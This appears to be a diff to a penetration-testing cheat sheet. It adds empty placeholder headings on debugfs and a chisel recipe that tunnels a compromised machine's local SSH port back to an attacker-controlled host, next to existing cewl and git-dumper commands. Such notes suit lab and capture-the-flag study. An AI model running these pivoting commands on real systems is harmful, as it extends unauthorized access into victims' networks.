@@ -326,3 +326,15 @@ cewl $URL -w cewl.list
 ```bash
 git-dumper http://ip/.git ~/dir
 ```
+
+# debugfs (how and when to use is)
+## fisrt 
+
+## second 
+
+# Port forwarding with chisel
+client server tool
+## Start chisel server
+./chisel server -p 8000 --reverse 
+## From the compromised box, run chisel client 
+./chisel client YOUR_IP:8000 R:2222:127.0.0.1:22 
